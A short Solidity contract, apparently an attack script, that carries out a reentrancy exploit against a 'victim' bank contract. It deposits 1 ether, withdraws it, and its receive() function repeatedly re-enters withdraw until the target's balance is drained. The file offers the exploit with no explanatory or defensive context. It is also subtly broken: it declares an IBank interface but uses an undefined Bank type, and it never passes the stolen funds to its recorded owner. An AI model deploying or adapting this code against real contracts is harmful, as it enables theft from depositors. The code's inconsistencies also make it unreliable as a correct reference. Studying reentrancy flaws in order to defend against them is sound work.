interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract ReentryProbe {
    Bank public victim;
    address public owner;

    constructor(address _victim) {
        victim = Bank(_victim);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }

    function execute() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }
}